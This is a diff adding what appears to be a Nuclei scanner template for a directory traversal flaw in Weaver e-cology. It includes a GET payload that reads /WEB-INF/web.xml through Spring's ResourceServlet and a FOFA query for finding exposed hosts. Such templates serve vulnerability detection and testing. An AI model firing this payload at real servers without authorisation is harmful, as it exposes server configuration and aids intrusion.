@@ -1,0 +1,23 @@
+id: fanwei-e-cology-springframework-directory-traversal
+info:
+  name: Ecology Springframework Directory Traversal
+  author: princechaddha
+  severity: medium
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/muc8pk
+  tags: fanwei-e-cology,lfi
+  metadata:
+    fofa-query: 'body="泛微协同" || body="wev8" || body="ecology" || body="e-cology" || body="wui/index.html" || header="ecology_JSessionId"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "<url-pattern>/weaver/"
